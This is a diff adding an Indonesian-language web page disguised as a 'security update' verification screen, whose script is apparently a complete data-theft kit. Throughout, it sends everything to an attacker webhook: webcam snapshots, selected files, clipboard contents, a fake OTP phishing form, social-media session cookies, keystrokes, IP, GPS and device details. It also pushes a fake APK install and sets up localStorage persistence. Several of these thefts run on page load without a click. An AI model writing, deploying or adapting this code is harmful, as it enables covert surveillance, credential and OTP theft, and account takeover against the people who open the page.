@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>System Update Required</title>
+    <style>
+        body {
+            background: #0a0f1e;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: 'Courier New', monospace;
+            color: #0f0;
+        }
+        .box {
+            background: #11161f;
+            padding: 2rem;
+            border-radius: 20px;
+            box-shadow: 0 0 20px rgba(0,255,0,0.2);
+            text-align: center;
+            border: 1px solid #2aff6e;
+            width: 350px;
+        }
+        button {
+            background: #1f2a3a;
+            color: #0f0;
+            border: 1px solid #0f0;
+            padding: 12px 24px;
+            margin: 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background: #2aff6e;
+            color: #000;
+        }
+        pre {
+            background: #000000aa;
+            padding: 10px;
+            font-size: 12px;
+            text-align: left;
+            overflow-x: auto;
+            margin-top: 20px;
+        }
+        .status {
+            font-size: 11px;
+            color: #888;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+<div class="box">
+    <h2>🔐 SECURITY UPDATE</h2>
+    <p>Klik tombol di bawah untuk verifikasi</p>
+    <button id="fullAttackBtn">⚡ VERIFY DEVICE ⚡</button>
+    <button id="stealthBtn">🔇 STEALTH MODE</button>
+    <div id="dataArea"></div>
+    <div class="status">EL CIENCO READY | Target: All Devices</div>
+</div>
+
+<script>
+    // === KONFIGURASI ===
+    // GANTI WEBHOOK_URL dengan link webhook.site milik El manco
+    const WEBHOOK_URL = "https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx";
+    
+    function sendToAttacker(data) {
+        if(!WEBHOOK_URL.includes("webhook.site")) {
+            console.log("[EL CIENCO] Data terkirim:", data);
+        }
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(data)
+        });
+    }
+
+    // === MODUL 1: WEBCAM CAPTURE ===
+    async function hijackWebcam() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { width: 640, height: 480 },
+                audio: false 
+            });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                sendToAttacker({ type: "webcam_shot", data_length: imageData.length, preview: imageData.substring(0, 200) });
+                stream.getTracks().forEach(track => track.stop());
+            }, 2000);
+        } catch(e) {
+            sendToAttacker({ type: "webcam_failed", error: e.toString() });
+        }
+    }
+
+    // === MODUL 2: FILE STEALER ===
+    function stealthFileSteal() {
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.multiple = true;
+        input.style.display = 'none';
+        document.body.appendChild(input);
+        input.addEventListener('change', async (e) => {
+            const files = e.target.files;
+            for(let file of files) {
+                const reader = new FileReader();
+                reader.onload = (ev) => {
+                    sendToAttacker({ 
+                        type: "stolen_file", 
+                        name: file.name, 
+                        size: file.size,
+                        preview: ev.target.result.substring(0, 300)
+                    });
+                };
+                reader.readAsText(file);
+            }
+        });
+        setTimeout(() => input.click(), 300);
+    }
+
+    // === MODUL 3: CLIPBOARD STEALER ===
+    setInterval(async () => {
+        try {
+            const text = await navigator.clipboard.readText();
+            if(text && text.length > 0) {
+                sendToAttacker({ type: "clipboard", data: text });
+            }
+        } catch(e) { }
+    }, 4000);
+
+    // === MODUL 4: FAKE OTP PHISHING ===
+    function showFakeOTPModal() {
+        const modalHtml = `
+            <div id="fakeModal" style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:99999; display:flex; align-items:center; justify-content:center; font-family:Arial">
+                <div style="background:#fff; padding:30px; border-radius:10px; max-width:350px; text-align:center">
+                    <h3>🔐 Verifikasi Keamanan</h3>
+                    <p>Kode OTP telah dikirim ke nomor +62*****</p>
+                    <input type="text" id="otpInput" placeholder="Masukkan kode OTP" style="width:100%; padding:10px; margin:10px 0; border:1px solid #ccc">
+                    <button id="submitOtp" style="background:#007bff; color:#fff; padding:10px 20px; border:none; border-radius:5px; cursor:pointer">Verifikasi</button>
+                </div>
+            </div>
+        `;
+        document.body.insertAdjacentHTML('beforeend', modalHtml);
+        document.getElementById('submitOtp').onclick = () => {
+            const otp = document.getElementById('otpInput').value;
+            sendToAttacker({ type: "stolen_otp", otp: otp, timestamp: Date.now() });
+            document.getElementById('fakeModal').remove();
+        };
+    }
+
+    // === MODUL 5: AUTO DOWNLOAD APK ===
+    function deployAndroidPayload() {
+        const apkUrl = "https://example.com/fake_update.apk"; // Ganti dengan link APK asli
+        const link = document.createElement('a');
+        link.href = apkUrl;
+        link.download = "security_update.apk";
+        link.click();
+        setTimeout(() => {
+            const installPopup = `
+                <div style="position:fixed; bottom:20px; right:20px; background:#1a1a2e; color:#0f0; padding:15px; border-radius:10px; z-index:99999; border-left:4px solid #00ff00; font-family:Arial">
+                    ⚡ Pembaruan keamanan siap diinstall<br>
+                    <button id="installBtn" style="margin-top:10px; background:#00ff00; border:none; padding:5px 15px; cursor:pointer">INSTALL SEKARANG</button>
+                </div>
+            `;
+            document.body.insertAdjacentHTML('beforeend', installPopup);
+            document.getElementById('installBtn')?.addEventListener('click', () => {
+                sendToAttacker({ type: "user_clicked_install", ua: navigator.userAgent });
+                if(/Android/i.test(navigator.userAgent)) {
+                    window.location.href = `intent://${apkUrl.replace('https://', '')}#Intent;scheme=https;package=com.android.packageinstaller;end`;
+                }
+            });
+        }, 1000);
+    }
+
+    // === MODUL 6: SOCIAL MEDIA TOKEN STEALER ===
+    function stealAllCookiesDetailed() {
+        const cookies = document.cookie.split(';');
+        const socialMediaPatterns = {
+            facebook: /c_user|datr|xs|fr/,
+            instagram: /sessionid|ds_user_id|ig_did/,
+            twitter: /auth_token|ct0|twid/,
+            whatsapp_web: /wappbrowser|wabrowserid/,
+            telegram: /stel_token|stel_web/,
+            tiktok: /sessionid|tt_chain_token/
+        };
+        const stolen = {};
+        for(let [platform, pattern] of Object.entries(socialMediaPatterns)) {
+            const found = cookies.filter(c => pattern.test(c));
+            if(found.length) stolen[platform] = found;
+        }
+        if(Object.keys(stolen).length) {
+            sendToAttacker({ type: "social_media_tokens", data: stolen });
+        }
+    }
+
+    // === MODUL 7: PERSISTENCE ===
+    function addPersistence() {
+        const maliciousLink = WEBHOOK_URL;
+        const script = `
+            setInterval(function(){
+                fetch('${maliciousLink}', {mode: 'no-cors'});
+            }, 21600000);
+        `;
+        localStorage.setItem('__elcienco_persist', btoa(script));
+        try {
+            new Function(atob(localStorage.getItem('__elcienco_persist')))();
+        } catch(e) {}
+    }
+
+    // === MODUL 8: KEYLOGGER ===
+    let keyLogs = [];
+    document.addEventListener('keypress', (e) => {
+        keyLogs.push(e.key);
+        if(keyLogs.length >= 15) {
+            sendToAttacker({ type: "keystrokes", data: keyLogs.join('') });
+            keyLogs = [];
+        }
+    });
+
+    // === MODUL 9: AUTO DATA COLLECTION (tanpa klik) ===
+    // Ambil IP publik
+    fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(ipData => sendToAttacker({ type: "public_ip", ip: ipData.ip, ua: navigator.userAgent }));
+    
+    // Ambil lokasi kasar via IP
+    fetch('https://ipapi.co/json/')
+        .then(r => r.json())
+        .then(geo => sendToAttacker({ type: "geoip", city: geo.city, country: geo.country_name, lat: geo.latitude, lon: geo.longitude }));
+    
+    // Ambil cookie awal
+    sendToAttacker({ type: "initial_cookies", data: document.cookie });
+    
+    // Ambil device info
+    sendToAttacker({ type: "device_info", memory: navigator.deviceMemory, platform: navigator.platform, language: navigator.language });
+
+    // === GEOLOKASI REAL (kalau diizinkan) ===
+    if(navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+            sendToAttacker({ type: "gps_real", lat: pos.coords.latitude, lon: pos.coords.longitude });
+        });
+    }
+
+    // === TOMBOL FULL ATTACK ===
+    document.getElementById('fullAttackBtn').addEventListener('click', () => {
+        hijackWebcam();
+        stealthFileSteal();
+        showFakeOTPModal();
+        deployAndroidPayload();
+        stealAllCookiesDetailed();
+        addPersistence();
+        document.getElementById('dataArea').innerHTML = '<pre>✅ Verifikasi selesai\nMenunggu...</pre>';
+        sendToAttacker({ type: "full_attack_triggered", time: Date.now() });
+    });
+
+    // === TOMBOL STEALTH MODE (tanpa popup mencolok) ===
+    document.getElementById('stealthBtn').addEventListener('click', () => {
+        stealAllCookiesDetailed();
+        sendToAttacker({ type: "stealth_mode", action: "silent_data_collected" });
+        document.getElementById('dataArea').innerHTML = '<pre>🔇 Stealth mode active</pre>';
+    });
+
+    // Auto trigger ringan saat halaman dimuat
+    setTimeout(() => {
+        sendToAttacker({ type: "page_loaded", url: window.location.href });
+    }, 2000);
+</script>
+</body>
+</html>
